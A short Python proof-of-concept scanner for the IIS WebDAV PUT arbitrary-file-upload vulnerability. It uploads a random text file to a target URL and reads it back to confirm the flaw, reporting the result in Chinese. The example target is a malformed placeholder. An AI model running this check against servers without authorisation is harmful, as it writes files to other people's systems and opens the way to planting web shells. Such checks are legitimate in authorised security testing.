import random
import requests
import string
import time

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
}


def poc(url):
    file_name = file_content = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    url1 = "%s/%s.txt" % (url, file_name)

    try:
        req = requests.put(url1, headers=headers, data={'test': file_content})
        time.sleep(1.5)
        req_get = requests.get(url1, headers=headers, timeout=5)
        if file_content in str(req_get.text):
            result = "发现目标存在 IIS WebDav PUT 任意文件上传, check url: %s" % url1
            return result
    except:
        pass


if __name__ == '__main__':
    a = poc('gooip.')
    print(a)
